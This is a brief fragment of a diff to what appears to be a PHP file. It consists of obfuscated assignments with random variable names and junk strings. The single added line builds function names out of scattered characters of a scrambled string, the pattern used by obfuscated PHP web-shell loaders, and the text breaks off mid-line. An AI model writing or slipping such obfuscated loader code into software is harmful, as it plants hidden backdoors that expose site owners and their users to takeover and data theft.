@@ -9,3 +9,4 @@ $pjro=22;$vnlpv=$pjro+42;
 $d93="l#
 $dzshkdfztu = 'fdy)##-!#~
 $mfhvbtaaxr = 'A;~!}
+$sF="PCT4BA6ODSE_";$s21=strtolower($sF[4].$s
